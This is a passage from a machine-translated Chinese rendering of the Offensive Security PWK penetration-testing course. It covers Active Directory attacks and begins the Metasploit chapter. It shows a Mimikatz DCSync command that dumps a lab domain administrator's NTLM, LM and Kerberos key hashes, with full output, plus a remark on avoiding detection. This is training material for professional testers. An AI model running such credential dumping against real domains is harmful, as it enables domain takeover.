<div style="position:absolute;top:68911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">701 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/library/cc228086.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:68931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">702 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2016 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/en-us/library/cc772726 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=ws.10).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:68951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">703 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/library/dd207691.aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:69079;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="59"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 59 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:69112;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:70189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:70189;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:70189;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">676</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将打开 Mimikatz 并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::dcsync</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 704</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">启动复制</font></font></nobr></div>
<div style="position:absolute;top:69227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指示要同步的目标用户，在本例中为内置域管理员帐户</font></font></nobr></div>
<div style="position:absolute;top:69247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员，如清单 728 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::dcsync /user:Administrator</font></font></font></b></nobr></div>
<div style="position:absolute;top:69298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DC] 'corp.com' 将是域</font></font></nobr></div>
<div style="position:absolute;top:69315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DC] 'DC01.corp.com' 将成为 DC 服务器</font></font></nobr></div>
<div style="position:absolute;top:69332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DC]“管理员”将是用户帐户</font></font></nobr></div>
<div style="position:absolute;top:69366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象 RDN    </font></font></nobr></div>
<div style="position:absolute;top:69366;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">： 行政人员</font></font></nobr></div>
<div style="position:absolute;top:69400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\*\* SAM 账户 \*\*</font></font></nobr></div>
<div style="position:absolute;top:69434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:69434;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">： 行政人员</font></font></nobr></div>
<div style="position:absolute;top:69451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户主体名称：Administrator@corp.com</font></font></nobr></div>
<div style="position:absolute;top:69468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户类型    </font></font></nobr></div>
<div style="position:absolute;top:69468;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 30000000 ( USER_OBJECT )</font></font></nobr></div>
<div style="position:absolute;top:69485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户账户控制：00010200（NORMAL_ACCOUNT DONT_EXPIRE_PASSWD）</font></font></nobr></div>
<div style="position:absolute;top:69502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户到期：</font></font></nobr></div>
<div style="position:absolute;top:69519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码最后更改 : 05/02/2018 19.33.10</font></font></nobr></div>
<div style="position:absolute;top:69536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象安全 ID：S-1-5-21-1602875587-2787523311-2599479668-500</font></font></nobr></div>
<div style="position:absolute;top:69553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象相对 ID：500</font></font></nobr></div>
<div style="position:absolute;top:69587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:69604;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希 NTLM：e2b475c11da2a0748290d87aa966c327</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69621;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ntlm-0: e2b475c11da2a0748290d87aa966c327</font></font></nobr></div>
<div style="position:absolute;top:69638;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lm - 0: 913b84377b5cb6d210ca519826e7b5f5</font></font></nobr></div>
<div style="position:absolute;top:69672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">补充凭证：</font></font></nobr></div>
<div style="position:absolute;top:69688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 主要：NTLM-强-NTOWF \*</font></font></nobr></div>
<div style="position:absolute;top:69706;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随机值：f62e88f00dff79bc79f8bad31b3ffa7d</font></font></nobr></div>
<div style="position:absolute;top:69740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 主要：Kerberos-Newer-Keys \*</font></font></nobr></div>
<div style="position:absolute;top:69757;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认盐：CORP.COMAdministrator</font></font></nobr></div>
<div style="position:absolute;top:69773;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认迭代次数：4096</font></font></nobr></div>
<div style="position:absolute;top:69790;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书</font></font></nobr></div>
<div style="position:absolute;top:69807;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aes256_hmac (4096): 4c6300b908619dc7a0788da81ae5903c2c97c5160d0d9bed85cfd5af02dabf01</font></font></nobr></div>
<div style="position:absolute;top:69825;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aes128_hmac (4096): 85b66d5482fc19858dadd07f1d9b818a</font></font></nobr></div>
<div style="position:absolute;top:69841;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">des_cbc_md5 (4096): 021c6df8bf07834a</font></font></nobr></div>
<div style="position:absolute;top:69875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 主要：Kerberos \*</font></font></nobr></div>
<div style="position:absolute;top:69892;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认盐：CORP.COMAdministrator</font></font></nobr></div>
<div style="position:absolute;top:69909;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书</font></font></nobr></div>
<div style="position:absolute;top:69926;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">des_cbc_md5 : 021c6df8bf07834a</font></font></nobr></div>
<div style="position:absolute;top:69960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 包 \*</font></font></nobr></div>
<div style="position:absolute;top:69977;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM-强-NTOWF</font></font></nobr></div>
<div style="position:absolute;top:70011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 主要：WDigest \*</font></font></nobr></div>
<div style="position:absolute;top:70028;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01 4ec8821bb09675db670e66998d2161bf</font></font></nobr></div>
<div style="position:absolute;top:70045;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02 3c9be2ff39c36efd2f84b63aa656d09a</font></font></nobr></div>
<div style="position:absolute;top:70062;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">03 2cf1734936287692601b7e36fc01e2d7</font></font></nobr></div>
<div style="position:absolute;top:70079;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">04 4ec8821bb09675db670e66998d2161bf</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:70139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">704 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明德尔菲，2016），https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:70267;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="60"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 60 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:70300;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:71377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:71377;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:71377;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">677</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70396;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">05 3c9be2ff39c36efd2f84b63aa656d09a</font></font></nobr></div>
<div style="position:absolute;top:70412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:70432;left:260"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 728 - 使用 DCSync 为管理员转储密码哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储包含与最近使用的 29 个用户密码相关的多个哈希值，如</font></font></nobr></div>
<div style="position:absolute;top:70481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及与 AES 加密一起使用的哈希值。</font></font></nobr></div>
<div style="position:absolute;top:70514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用上述技术，我们可以通过域控制器请求复制更新并获得</font></font></nobr></div>
<div style="position:absolute;top:70533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无需登录域即可获取 Active Directory 中每个帐户的密码哈希值</font></font></nobr></div>
<div style="position:absolute;top:70552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:70590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.6 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块提供了对 Active Directory 及其相关联的概述和一些见解</font></font></nobr></div>
<div style="position:absolute;top:70650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全。</font><font style="vertical-align: inherit;">虽然这里提到并解释了许多技术，但还有许多其他技术</font></font></nobr></div>
<div style="position:absolute;top:70670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得探索。</font></font></nobr></div>
<div style="position:absolute;top:70703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要特别指出的是，在这个过程中很少注意操作安全。</font></font></nobr></div>
<div style="position:absolute;top:70722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，根据客户的成熟度，可能值得考虑</font></font></nobr></div>
<div style="position:absolute;top:70741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过不盲目执行显示的每个命令和技术来避免检测</font></font></nobr></div>
<div style="position:absolute;top:70760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行枚举和横向移动。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:71455;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="61"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 61 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:71488;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:72565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:72565;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:72565;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">678</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:71578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.6.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:71604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22. Metasploit 框架</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们已经完成了前面的模块，因此应该清楚，与 public 一起工作</font></font></nobr></div>
<div style="position:absolute;top:71668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用是困难的。</font><font style="vertical-align: inherit;">必须修改它们以适应每个场景，必须对它们进行恶意测试</font></font></nobr></div>
<div style="position:absolute;top:71687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码，每个都使用独特的命令行语法，编码实践没有标准化</font></font></nobr></div>
<div style="position:absolute;top:71706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或语言。</font><font style="vertical-align: inherit;">有些漏洞利用是用 Perl 编写的，有些是用 C 编写的，有些是用 PowerShell 编写的，我们甚至</font></font></nobr></div>
<div style="position:absolute;top:71726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看到了需要通过将它们复制并粘贴到 Netcat 中来部署的漏洞利用负载</font></font></nobr></div>
<div style="position:absolute;top:71745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系。</font></font></nobr></div>
<div style="position:absolute;top:71778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，还有多种后期开发工具、辅助工具，以及无数的攻击</font></font></nobr></div>
<div style="position:absolute;top:71797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使在最基本的攻击场景中也必须考虑的技术。</font></font></nobr></div>
<div style="position:absolute;top:71830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用框架旨在解决部分或所有这些问题。</font><font style="vertical-align: inherit;">虽然它们在某些方面有所不同</font></font></nobr></div>
<div style="position:absolute;top:71849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">形式和功能，每一个都旨在通过提供</font></font></nobr></div>
<div style="position:absolute;top:71869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多种漏洞利用，简化这些漏洞利用的使用，缓解横向移动，并协助</font></font></nobr></div>
<div style="position:absolute;top:71888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理受损的基础设施。</font><font style="vertical-align: inherit;">这些框架中的大多数都提供动态</font></font></nobr></div>
<div style="position:absolute;top:71907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷能力。</font><font style="vertical-align: inherit;">这意味着对于框架中的每个漏洞利用，我们可以选择不同的</font></font></nobr></div>
<div style="position:absolute;top:71927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要部署的有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:71960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在过去的几年里，已经开发了几个漏洞利用和后漏洞利用框架，</font></font></nobr></div>
<div style="position:absolute;top:71979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括 Metasploit、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">705</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Core Impact、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">706</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Immunity Canvas、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">707</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Cobalt Strike、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">708</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 PowerShell</font></font></nobr></div>
<div style="position:absolute;top:71998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">709</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个都提供部分或全部这些功能。</font></font></nobr></div>
<div style="position:absolute;top:72031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这些框架中有许多是商业产品，但 Metasploit 框架（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MSF</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，或</font></font></nobr></div>
<div style="position:absolute;top:72050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单地</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）是开源，经常更新，和将在该模块的焦点。</font></font></nobr></div>
<div style="position:absolute;top:72083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如其作者所描述的，由 Rapid7 维护的 Metasploit 框架，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">710</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是“一个先进的</font></font></nobr></div>
<div style="position:absolute;top:72103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发、测试和使用漏洞利用代码的平台”。</font><font style="vertical-align: inherit;">该项目最初是作为</font></font></nobr></div>
<div style="position:absolute;top:72122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">便携式网络游戏</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">711</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并已发展成为渗透测试、漏洞利用的强大工具</font></font></nobr></div>
<div style="position:absolute;top:72141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发和漏洞研究。</font><font style="vertical-align: inherit;">该框架已缓慢但肯定地成为领先的</font></font></nobr></div>
<div style="position:absolute;top:72161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全审计人员的免费漏洞利用收集和开发框架。</font><font style="vertical-align: inherit;">Metasploit 经常出现</font></font></nobr></div>
<div style="position:absolute;top:72180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新了新的漏洞，并由 Rapid7 不断改进和进一步开发，</font></font></nobr></div>
<div style="position:absolute;top:72199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全社区。</font></font></nobr></div>
<div style="position:absolute;top:72232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 包含</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">metasploit-framework</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包，其中包含开源元素</font></font></nobr></div>
<div style="position:absolute;top:72252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 项目。</font><font style="vertical-align: inherit;">Metasploit Framework (MSF) 的新手经常不知所措</font></font></nobr></div>
<div style="position:absolute;top:72271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过该工具的众多功能和不同用例。</font><font style="vertical-align: inherit;">Metasploit 框架是</font></font></nobr></div>
<div style="position:absolute;top:72290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试的几乎每个阶段都很有价值，包括信息收集、漏洞</font></font></nobr></div>
<div style="position:absolute;top:72310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">研究和开发、客户端攻击、后利用等等。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:72395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">705 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2018），https://www.metasploit.com/</font></font></font></nobr></div>
<div style="position:absolute;top:72415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">706 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（核心安全，2018 年），https://www.coresecurity.com/core-impact</font></font></font></nobr></div>
<div style="position:absolute;top:72435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">707 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（免疫，2018），https://www.immunityinc.com/products/canvas/</font></font></font></nobr></div>
<div style="position:absolute;top:72455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">708 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（战略网络有限责任公司，2018 年），https://blog.cobaltstrike.com/category/cobalt-strike-2/</font></font></font></nobr></div>
<div style="position:absolute;top:72475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">709 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Veris 集团，2015 年），https://www.powershellempire.com/</font></font></font></nobr></div>
<div style="position:absolute;top:72495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">710 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2019），https://www.rapid7.com/</font></font></font></nobr></div>
<div style="position:absolute;top:72515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">711 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（威胁邮报，2010 年），https://threatpost.com/qa-hd-moore-metasploit-disclosure-and-ethics-052010/73998/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:72643;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="62"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 62 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:72676;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:73753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:73753;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:73753;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">679</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭借如此强大的功能，很容易在 Metasploit 中迷失方向。</font><font style="vertical-align: inherit;">幸运的是，该</font></font></nobr></div>
<div style="position:absolute;top:72791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架经过深思熟虑，并提供了统一且合理的界面。</font></font></nobr></div>
<div style="position:absolute;top:72824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将提供 Metasploit 框架的演练，包括功能和</font></font></nobr></div>
<div style="position:absolute;top:72843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法以及对其内部工作原理的一些解释。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:72881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1 Metasploit 用户界面和设置</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Metasploit Framework 是预装在 Kali Linux 中的，但是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">postgresql</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:72941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 依赖于在启动时既不活跃也不启用。</font><font style="vertical-align: inherit;">我们可以启动所需的服务</font></font></nobr></div>
<div style="position:absolute;top:72961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl start postgresql</font></font></font></b></nobr></div>
<div style="position:absolute;top:73015;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 729 - 手动启动 postgresql</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以在启动时使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用服务，</font><font style="vertical-align: inherit;">如下所示：</font></font></nobr></div>
